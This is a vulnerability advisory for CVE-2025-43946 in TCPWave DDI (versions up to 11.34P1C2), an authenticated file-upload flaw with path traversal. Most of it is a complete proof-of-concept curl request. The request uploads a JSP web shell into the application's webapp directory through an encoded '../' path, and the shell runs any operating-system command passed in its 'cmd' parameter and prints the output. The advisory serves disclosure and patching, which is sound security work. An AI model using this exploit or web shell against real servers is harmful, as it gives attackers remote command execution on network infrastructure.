# CVE-2025-43946
TCPWave DDI version 11.34P1C2 was found vulnerable to remote code execution via the unrestricted file upload and path traversal. The vulnerability lies on its file
upload functionality, where there is no proper validation on file type allowing any users tocupload files to the server. Moreover, any user can perform path traversal to upload files to
any location within the server, which can further lead to remote code execution.

# Affected Product & Version
TCPWave DDI version <= 11.34P1C2 </br>

Reference: https://tcpwave.com/ddi-dns-dhcp-ipam

# PoC
cURL command:
````
curl --path-as-is -i -s -k -X $'POST' \

-H $'Host: YOUR-INSTANCE-URL ' -H $'Content-Length: 898' -H $'Sec-Ch-Ua-Platform:
\"Linux\"' -H $'Accept-Language: en-US,en;q=0.9' -H $'Sec-Ch-Ua: \"Chromium\";v=\"133\",
\"Not(A:Brand\";v=\"99\"' -H $'Sec-Ch-Ua-Mobile: ?0' -H $'X-Requested-With: XMLHttpRequest' -H
$'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/
133.0.0.0 Safari/537.36' -H $'Accept: */*' -H $'Content-Type: text/plain; charset=UTF-8' -H $'Origin:
https:// YOUR-INSTANCE-URL ' -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Fetch-Mode: cors' -H
$'Sec-Fetch-Dest: empty' -H $'Referer: https:// YOUR-INSTANCE-URL/tims/import' -H $'Accept-
Encoding: gzip, deflate, br' -H $'Priority: u=1, i' -H $'Connection: keep-alive' \

-b $'JSESSIONID=YOUR_SESSION_ID' \

--data-binary $'<%@ page import=\"java.util.*,java.io.*\"%>\x0d\x0a<%
\x0d\x0a%>\x0d\x0a<HTML><BODY>\x0d\x0aCommands with JSP\x0d\x0a<FORM
METHOD=\"GET\" NAME=\"myform\" ACTION=\"\">\x0d\x0a<INPUT TYPE=\"text\"
NAME=\"cmd\">\x0d\x0a<INPUT TYPE=\"submit\" VALUE=\"Send\">\x0d\x0a</
FORM>\x0d\x0a<pre>\x0d\x0a<%\x0d\x0aif (request.getParameter(\"cmd\") != null) {\x0d\x0a
out.println(\"Command: \" + request.getParameter(\"cmd\") + \"<BR>\");\x0d\x0a Process p;
\x0d\x0a if ( System.getProperty(\"os.name\").toLowerCase().indexOf(\"windows\") != -1){\x0d\x0a
p = Runtime.getRuntime().exec(\"cmd.exe /C \" + request.getParameter(\"cmd\"));\x0d\x0a }
\x0d\x0a else{\x0d\x0a p = Runtime.getRuntime().exec(request.getParameter(\"cmd\"));
\x0d\x0a }\x0d\x0a OutputStream os = p.getOutputStream();\x0d\x0a InputStream in =
p.getInputStream();\x0d\x0a DataInputStream dis = new DataInputStream(in);\x0d\x0a String disr
= dis.readLine();\x0d\x0a while ( disr != null ) {\x0d\x0a out.println(disr);\x0d\x0a disr =
dis.readLine();\x0d\x0a }\x0d\x0a}\x0d\x0a%>\x0d\x0a</pre>\x0d\x0a</BODY></HTML>' \

$'https://YOUR-INSTANCE-URL/tims/rest/files/upload/
%2e%2e%2fserverTempDir%2FjEtTySERver%2Fwebapp%2Fpoc.jsp'
````

# Credits
This vulnerability was discovered by Rahul Kadavil of Henkel Cyber Security Team.
